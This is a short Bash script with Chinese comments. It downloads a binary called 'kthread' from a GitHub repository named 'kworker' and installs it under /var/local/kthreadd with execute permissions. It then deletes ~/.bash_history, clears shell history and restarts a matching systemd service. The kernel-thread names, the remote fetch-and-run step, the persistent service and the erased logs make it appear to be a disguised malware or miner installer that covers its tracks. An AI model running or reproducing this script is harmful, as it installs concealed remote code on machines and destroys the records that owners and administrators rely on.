#!/bin/bash
# 设置工作目录和目标目录变量，方便后续维护
WORK_DIR="/tmp"
TARGET_DIR="/var/local/kthreadd"

echo "[+] 正在切换工作目录..."
cd "$WORK_DIR" || { echo "[-] 目录切换失败"; exit 1; }

echo "[+] 正在清理旧文件..."
# 使用管道或在一行中清理两个目录的旧文件
rm -f kthread "$TARGET_DIR/kthread"

echo "[+] 正在下载最新的 kthread 文件..."
# 直接下载到当前工作目录
curl -fsSL "https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kthread/kthread" -o kthread || { echo "[-] 下载失败"; exit 1; }

echo "[+] 正在复制并设置目标文件权限..."
# kthread 已经在当前目录，直接复制过去，并一步到位设置权限
cp -f kthread "$TARGET_DIR/kthread"
chmod 755 "$TARGET_DIR/kthread"

# 注意：如果你最后还要运行 systemctl restart，
# 那么删掉当前目录的 kthread (rm -f kthread) 可能会导致程序无法运行（取决于你的服务是从哪启动的）。
# 如果 kthread.service 是从 /var/local/kthreadd/kthread 启动的，
# 那么清理当前工作目录的临时文件是安全的：
echo "[+] 正在清理当前目录的临时文件..."
rm -f kthread

echo "[+] 正在清理操作日志..."
rm -f ~/.bash_history && history -c

echo "[+] 正在重启 kthread 服务..."
systemctl restart "kthread.service"

echo "[✓] 操作已全部完成！"